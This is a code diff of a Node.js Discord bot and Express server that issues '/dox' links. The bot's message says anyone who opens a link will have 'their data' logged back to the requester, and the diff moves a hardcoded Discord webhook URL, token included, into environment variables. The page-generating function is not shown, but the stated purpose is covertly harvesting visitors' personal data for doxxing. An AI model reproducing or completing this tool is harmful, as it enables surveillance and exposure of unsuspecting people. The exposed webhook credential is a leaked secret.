@@ -3,57 +3,69 @@ const crypto = require('crypto');
 const express = require('express');
 const app = express();
 
+// ---- ENVIRONMENT VARIABLES ----
 const TOKEN = process.env.TOKEN;
-const CHANNEL_ID = '1545625444152381482';
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545626900511072348/g0reYyMdhAuwS9JSNmYk73GxHdgRqz3K7QX16uXS007Uj9KNiUAlMQznjeAkqnBha_E2';
+const CHANNEL_ID = process.env.CHANNEL_ID;
+const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const PORT = process.env.PORT || 3000;
 
 // ---- MINIMAL INTENTS ----
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds
-    ]
+    ],
 });
 
+// ---- STORE ACTIVE LINKS ----
 const links = new Map();
 
+// ---- EXPRESS SERVER (for dox pages) ----
 app.get('/dox/:id', (req, res) => {
     const id = req.params.id;
-    if (!links.has(id)) return res.status(404).send('Link expired.');
+    if (!links.has(id)) return res.status(404).send('Link expired or invalid.');
     res.send(generateDoxHTML());
 });
 
-app.listen(PORT, () => console.log(`🌐 Server running on port ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`🌐 Dox server running on port ${PORT}`);
+});
 
+// ---- DISCORD BOT ----
 client.once('ready', () => {
     console.log(`🤖 Logged in as ${client.user.tag}`);
     // Register slash command
     client.application.commands.create({
         name: 'dox',
         description: 'Generate a fresh dox link',
-    }).then(() => console.log('✅ Slash command registered'))
-      .catch(err => console.error('❌ Failed to register command:', err));
+    })
+    .then(() => console.log('✅ Slash command registered'))
+    .catch(err => console.error('❌ Failed to register command:', err));
 });
 
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
     if (interaction.commandName === 'dox') {
         await interaction.deferReply({ ephemeral: true });
+
         const id = crypto.randomBytes(6).toString('hex');
-        const url = `http://localhost:3000/dox/${id}`; // Change to ngrok URL later
-        links.set(id, { created: Date.now(), user: interaction.user.tag });
-        
+        const url = `https://YOUR_RENDER_URL.onrender.com/dox/${id}`; // ⚠️ CHANGE THIS
+
+        links.set(id, {
+            created: Date.now(),
+            user: interaction.user.tag
+        });
+
         const embed = new EmbedBuilder()
             .setTitle('✅ Dox Link Ready')
             .setColor(0x22c55e)
             .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their data will be logged here.`)
             .setFooter({ text: 'Expires after 100 links generated' });
-        
+
         await interaction.editReply({ embeds: [embed] });
     }
 });
 
-// ---- CLEANUP ----
+// ---- CLEANUP OLD LINKS ----
 setInterval(() => {
     const keys = Array.from(links.keys());
     if (keys.length > 100) {
